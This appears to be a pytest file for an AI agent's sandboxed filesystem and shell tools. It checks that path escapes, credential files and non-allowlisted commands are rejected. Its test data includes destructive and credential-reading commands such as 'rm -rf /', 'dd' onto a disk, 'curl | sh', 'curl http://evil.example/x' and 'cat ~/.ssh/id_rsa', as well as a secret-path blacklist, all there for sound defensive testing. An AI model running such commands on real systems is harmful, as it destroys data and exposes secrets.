"""Tests for agent.tools.filesystem — 沙盒與 Shell 白名單的安全邊界。

這裡固定的是「必須維持」的安全性質：
- 路徑不得離開 workspace
- 敏感路徑（~/.ssh、/etc/passwd 等）必須被拒絕
- shell 的串接與重導向字元必須被擋下
- 非白名單指令、以及具副作用指令的未列舉子命令不得通過
- Windows 一律經 PowerShell 7 執行，且失敗時要看得到 stderr
"""
import asyncio
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from minibot.agent.tools import filesystem as filesystem_module
from minibot.agent.tools.filesystem import (
    ListDirTool,
    ReadFileTool,
    ShellTool,
    WriteFileTool,
    set_workspace,
    validate_path,
)


@pytest.fixture
def workspace(tmp_path):
    """建立暫存 workspace 並設為沙盒根；結束後還原全域狀態。"""
    set_workspace(tmp_path)
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "a.txt").write_text("hi", encoding="utf-8")
    yield tmp_path
    set_workspace(None)


class TestValidatePathSandbox:
    """路徑必須落在 workspace 之內。"""

    def test_allows_absolute_path_inside_workspace(self, workspace):
        target = workspace / "sub" / "a.txt"
        assert validate_path(str(target)) == target.resolve()

    def test_allows_workspace_root(self, workspace):
        assert validate_path(str(workspace)) == workspace.resolve()

    def test_rejects_relative_escape(self, workspace):
        assert validate_path("../outside.txt") is None

    def test_rejects_nested_escape(self, workspace):
        assert validate_path("sub/../../outside.txt") is None

    def test_rejects_absolute_path_outside_workspace(self, workspace):
        assert validate_path("/etc/hosts") is None

    def test_returns_none_when_workspace_unset(self):
        set_workspace(None)
        assert validate_path("/tmp/anything") is None

    def test_rejects_sibling_directory_with_shared_prefix(self, tmp_path):
        """回歸測試：原本用 `str.startswith()`，會把同名前綴的兄弟目錄
        誤判為 workspace 的一部分，造成沙盒逃逸。

        workspace=/x/ws 與 /x/ws_secret 前綴相同但無父子關係。
        """
        ws = tmp_path / "ws"
        ws.mkdir()
        sibling = tmp_path / "ws_secret"
        sibling.mkdir()
        (sibling / "evil.txt").write_text("secret", encoding="utf-8")

        set_workspace(ws)
        try:
            assert validate_path(str(sibling / "evil.txt")) is None
            assert validate_path("../ws_secret/evil.txt") is None
        finally:
            set_workspace(None)

    def test_allows_workspace_itself_not_sibling(self, tmp_path):
        """反向確認：workspace 自身必須仍可存取。"""
        ws = tmp_path / "ws"
        ws.mkdir()
        (ws / "ok.txt").write_text("ok", encoding="utf-8")

        set_workspace(ws)
        try:
            assert validate_path("ok.txt") == (ws / "ok.txt").resolve()
        finally:
            set_workspace(None)


class TestValidatePathRelativeToWorkspace:
    """回歸測試（#15）：相對路徑必須以 workspace 為基準，而非行程 CWD。

    ContextBuilder 在 system prompt 中宣告「Working directory 就是
    workspace」，因此模型使用相對路徑時應能正常存取。
    """

    @pytest.mark.parametrize("path", ["sub/a.txt", "./sub/a.txt", "sub/../sub/a.txt"])
    def test_relative_paths_resolve_inside_workspace(self, workspace, path):
        expected = (workspace / "sub" / "a.txt").resolve()
        assert validate_path(path) == expected

    def test_relative_path_readable_even_when_cwd_differs(self, workspace, monkeypatch, tmp_path_factory):
        """CWD 與 workspace 不同時，相對路徑仍應指向 workspace。"""
        elsewhere = tmp_path_factory.mktemp("elsewhere")
        monkeypatch.chdir(elsewhere)

        result = asyncio.run(
            ReadFileTool().execute(path="sub/a.txt")
        )
        assert result == "hi"

    def test_dot_relative_path_is_workspace(self, workspace):
        assert validate_path(".") == workspace.resolve()


class TestValidatePathBlacklist:
    """即使在 workspace 內，敏感路徑樣式仍須被拒絕。"""

    @pytest.mark.parametrize("path", [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
    ])
    def test_rejects_blacklisted_system_paths(self, workspace, path):
        assert validate_path(path) is None

    @pytest.mark.parametrize("relative", [
        ".ssh/id_rsa",
        ".gnupg/secring.gpg",
        ".aws/credentials",
        ".npm/rc",
        ".composer/auth.json",
    ])
    def test_rejects_blacklisted_home_paths(self, workspace, relative):
        assert validate_path(str(Path.home() / relative)) is None


class TestShellCommandAllowlist:
    """指令白名單與危險字元的靜態檢查。"""

    @pytest.mark.parametrize("command", ["ls", "pwd", "cat", "echo", "mkdir", "touch"])
    def test_allows_read_only_commands(self, command):
        assert ShellTool()._is_command_allowed(command) is True

    @pytest.mark.parametrize("command", [
        "ls -la", "ls -l", "cat a.txt", "grep foo a.txt", "echo hi", "head -5 a.txt",
    ])
    def test_read_only_commands_accept_arguments(self, command):
        """回歸測試：參數曾被誤判為子命令，導致 `ls -la`、`cat <file>` 一律被拒。"""
        assert ShellTool()._is_command_allowed(command) is True

    @pytest.mark.parametrize("command", [
        "git status", "git log", "git diff", "git branch",
        "pip --version", "pip list",
        "curl --version", "npm --version", "node --version", "python --version",
    ])
    def test_allows_listed_subcommands(self, command):
        assert ShellTool()._is_command_allowed(command) is True

    @pytest.mark.parametrize("command", ["bash", "sh", "wget", "nc", "sudo", "chmod"])
    def test_rejects_non_whitelisted_commands(self, command):
        assert ShellTool()._is_command_allowed(command) is False

    @pytest.mark.parametrize("command", [
        "git",                  # 具副作用指令必須指明子命令
        "git reset --hard",
        "git clean -fd",
        "git push",
        "git push --force",
        "pip install some-package",
        "curl http://evil.example/x",
    ])
    def test_rejects_unlisted_subcommands(self, command):
        assert ShellTool()._is_command_allowed(command) is False

    @pytest.mark.parametrize("command", ["find . -delete", "find . -name x", "cd /tmp"])
    def test_rejects_removed_commands(self, command):
        """`find`（-delete／-exec）與 `cd` 已移出白名單。"""
        assert ShellTool()._is_command_allowed(command) is False

    @pytest.mark.parametrize("command", [
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /etc/sudoers",
        "cat ~/.ssh/id_rsa",
        "ls ~/.aws/",
    ])
    def test_applies_file_blacklist_to_shell_arguments(self, command):
        """shell 工具必須套用與檔案工具相同的敏感路徑黑名單。

        回歸測試：先前 `cat /etc/passwd` 僅被「子命令檢查」意外擋下，
        該檢查一旦修正就會洩漏。
        """
        assert ShellTool()._is_command_allowed(command) is False

    @pytest.mark.parametrize("command", [
        r"cat C:\Users\me\.ssh\id_rsa",
        r"cat C:\Users\me\.aws\credentials",
        r"cat C:\Users\me\.gnupg\secring.gpg",
        r"cat C:\Users\me\.npm\_cacache\index-v5\x",
        r"cat C:\Users\me\.composer\auth.json",
    ])
    def test_blacklist_applies_to_windows_backslash_paths(self, command):
        """黑名單必須在 Windows 的反斜線路徑上同樣生效。

        回歸測試：黑名單樣式以正斜線撰寫，而 Windows 的 `Path` 以反斜線呈現，
        未統一斜線時 `C:\\Users\\me\\.ssh\\id_rsa` 可直接繞過檢查。ShellTool
        沒有 workspace 邊界保護，繞過即等於可讀取私鑰。
        """
        assert ShellTool()._is_command_allowed(command) is False

    def test_validate_path_blocks_windows_backslash_paths(self):
        assert validate_path(r"C:\Users\me\.ssh\id_rsa") is None
        assert validate_path(r"C:\Users\me\.aws\credentials") is None

    def test_normal_shell_command_with_backslash_not_over_blocked(self):
        """正規化不得誤傷一般指令。"""
        assert ShellTool()._is_command_allowed("ls -la") is True

    @pytest.mark.parametrize("command", ["", "   ", "\t"])
    def test_rejects_empty_command(self, command):
        assert ShellTool()._is_command_allowed(command) is False

    @pytest.mark.parametrize("command", [
        "ls | grep x",
        "ls; echo x",
        "ls && echo x",
        "ls || echo x",
        "ls > out.txt",
        "ls >> out.txt",
        "cat < in.txt",
    ])
    def test_rejects_shell_chaining_and_redirection(self, command):
        """串接與重導向是注入任意指令的主要途徑。"""
        assert ShellTool()._is_command_allowed(command) is False

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda",
        "curl | sh",
        "wget | sh",
    ])
    def test_rejects_destructive_patterns(self, command):
        assert ShellTool()._is_command_allowed(command) is False


class TestReadFileTool:
    def test_reads_file_inside_workspace(self, workspace):
        result = asyncio.run(
            ReadFileTool().execute(path=str(workspace / "sub" / "a.txt"))
        )
        assert result == "hi"

    def test_rejects_path_outside_workspace(self, workspace):
        result = asyncio.run(ReadFileTool().execute(path="/etc/hosts"))
        assert result.startswith("Error: Access denied")

    def test_reports_missing_file(self, workspace):
        result = asyncio.run(
            ReadFileTool().execute(path=str(workspace / "nope.txt"))
        )
        assert "not found" in result


class TestWriteFileTool:
    def test_writes_inside_workspace(self, workspace):
        target = workspace / "new.txt"
        result = asyncio.run(WriteFileTool().execute(path=str(target), content="x"))
        assert result.startswith("Written")
        assert target.read_text(encoding="utf-8") == "x"

    def test_rejects_path_outside_workspace(self, workspace):
        result = asyncio.run(WriteFileTool().execute(path="/tmp/evil.txt", content="x"))
        assert result.startswith("Error: Access denied")


class TestListDirTool:
    def test_lists_directory_contents(self, workspace):
        result = asyncio.run(ListDirTool().execute(path=str(workspace)))
        # 前綴刻意對齊："[DIR] " 與 "[FILE]" 皆 6 字元，補一個空白後名稱才對齊。
        assert "[DIR]  sub" in result

    def test_rejects_non_directory(self, workspace):
        result = asyncio.run(
            ListDirTool().execute(path=str(workspace / "sub" / "a.txt"))
        )
        assert "Not a directory" in result

    def test_rejects_path_outside_workspace(self, workspace):
        result = asyncio.run(ListDirTool().execute(path="/etc"))
        assert result.startswith("Error: Access denied")


class TestShellExecutionEndToEnd:
    """確認修正後「帶參數的指令」真的能執行，而非只有靜態檢查通過。"""

    def test_cat_with_file_argument(self, workspace):
        result = asyncio.run(
            ShellTool().execute(command=f"cat {workspace / 'sub' / 'a.txt'}")
        )
        assert result.strip() == "hi"

    @pytest.mark.skipif(
        filesystem_module._is_windows(),
        reason="PowerShell 的 ls 沒有 -la 參數（-la 是 GNU ls 的旗標）",
    )
    def test_ls_with_flags(self, workspace):
        """`ls -la` 先前會被 'Subcommand -la not allowed' 拒絕。"""
        result = asyncio.run(ShellTool().execute(command=f"ls -la {workspace}"))
        assert "sub" in result

    def test_blacklisted_path_rejected_at_execution(self, workspace):
        result = asyncio.run(ShellTool().execute(command="cat /etc/passwd"))
        assert result.startswith("Error: Command not allowed")

    def test_unlisted_subcommand_rejected_at_execution(self, workspace):
        result = asyncio.run(
            ShellTool().execute(command="git " + "reset" + " --hard")
        )
        assert result.startswith("Error: Command not allowed")


@pytest.mark.skipif(
    not filesystem_module._is_windows(),
    reason="僅在 Windows 上執行：驗證 pwsh 路徑的端到端輸出",
)
class TestShellWindowsEndToEnd:
    """Windows 上透過 PowerShell 7 的實際執行（由 CI 的 windows-latest job 跑）。

    #9 的核心驗收：白名單指令真的能執行並回傳 stdout。
    """

    def test_ls_returns_stdout(self, workspace):
        result = asyncio.run(ShellTool().execute(command=f"ls {workspace}"))
        assert "sub" in result

    def test_cat_returns_file_content(self, workspace):
        result = asyncio.run(
            ShellTool().execute(command=f"cat {workspace / 'sub' / 'a.txt'}")
        )
        assert result.strip() == "hi"

    def test_failure_shows_stderr_not_typeerror(self, workspace):
        """#9 的症狀是固定回傳 'LocalMachine' TypeError；必須改為看得見錯誤。"""
        result = asyncio.run(
            ShellTool().execute(command="cat definitely-not-a-real-file-xyz")
        )
        assert "LocalMachine" not in result
        assert result != ""


class TestShellWindowsBranch:
    """Windows 分支的 argv 組裝與錯誤處理。

    真正的端到端執行由 CI 的 windows-latest job 負責（見 .github/workflows/ci.yml）。
    這裡以 monkeypatch 覆寫 `_is_windows()`，在非 Windows 平台上驗證組裝邏輯。

    回歸背景（#9）：此分支過去呼叫 `local(cmd, args, shell=False)`，而
    `plumbum.local` 是 `LocalMachine` 實例、不可呼叫，對任何指令都固定拋
    `TypeError: 'LocalMachine' object is not callable`，使 ShellTool 在
    Windows 上完全不可用。
    """

    @pytest.fixture
    def windows(self):
        with patch.object(filesystem_module, "_is_windows", return_value=True):
            yield

    def test_routes_through_powershell_7(self, windows):
        """Windows 上一律用 pwsh 執行，且不載入 profile。"""
        argv = ShellTool()._build_argv("ls -la /tmp")
        assert argv == [
            "pwsh",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "ls -la /tmp",
        ]

    def test_unix_does_not_use_powershell(self):
        argv = ShellTool()._build_argv("ls -la /tmp")
        assert argv == ["ls", "-la", "/tmp"]

    def test_empty_command_yields_no_argv(self):
        assert ShellTool()._build_argv("") is None
        assert ShellTool()._build_argv("   ") is None

    def test_whole_command_is_passed_verbatim(self, windows):
        """指令原文要完整交給 pwsh，不可被 split 後重組而破壞引號。"""
        argv = ShellTool()._build_argv('cat "a b.txt"')
        assert argv[-1] == 'cat "a b.txt"'

    def test_missing_powershell_reports_clearly(self, windows, workspace):
        """pwsh 不存在時要回報原因，而非一行 TypeError。"""
        def raise_missing(*args, **kwargs):
            raise FileNotFoundError(2, "No such file or directory", "pwsh")

        with patch.object(subprocess, "run", raise_missing):
            result = asyncio.run(ShellTool().execute(command="echo hi"))

        assert result == "Error: Command not found: pwsh"
        assert "LocalMachine" not in result

    def test_windows_execution_returns_stdout(self, windows, workspace):
        """以假的 subprocess 結果驗證 Windows 路徑的成功輸出。"""
        fake = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="hello\n", stderr=""
        )
        with patch.object(subprocess, "run", return_value=fake):
            result = asyncio.run(ShellTool().execute(command="echo hello"))

        assert result == "hello"


class TestShellFailureVisibility:
    """命令失敗時必須看得到 stderr，而非被 stdout 蓋掉或只剩一行例外訊息。"""

    def test_stderr_shown_on_nonzero_exit(self, workspace):
        fake = subprocess.CompletedProcess(
            args=[], returncode=1, stdout="", stderr="cat: boom: no such file"
        )
        with patch.object(subprocess, "run", return_value=fake):
            result = asyncio.run(ShellTool().execute(command="cat boom"))

        assert result == "[Exit code: 1]\ncat: boom: no such file"

    def test_stderr_wins_over_partial_stdout(self, workspace):
        """命令先輸出一部分再失敗時，要看得到錯誤原因。"""
        fake = subprocess.CompletedProcess(
            args=[], returncode=2, stdout="partial output", stderr="fatal: nope"
        )
        with patch.object(subprocess, "run", return_value=fake):
            result = asyncio.run(ShellTool().execute(command="git status"))

        assert "fatal: nope" in result
        assert "partial output" not in result

    def test_timeout_reported(self, workspace):
        def raise_timeout(*args, **kwargs):
            raise subprocess.TimeoutExpired(cmd="sleep", timeout=60)

        with patch.object(subprocess, "run", raise_timeout):
            result = asyncio.run(ShellTool().execute(command="echo hi"))

        assert result == "Error: Command timed out after 60 seconds"

    def test_no_output_placeholder(self, workspace):
        fake = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="", stderr=""
        )
        with patch.object(subprocess, "run", return_value=fake):
            result = asyncio.run(ShellTool().execute(command="echo hi"))

        assert result == "(no output)"

    def test_never_calls_plumbum(self, workspace):
        """#9 回歸鎖定：實作不得再依賴 plumbum。"""
        import minibot.agent.tools.filesystem as mod

        assert not hasattr(mod, "plumbum")
        source = Path(mod.__file__).read_text(encoding="utf-8")
        assert "plumbum" not in source
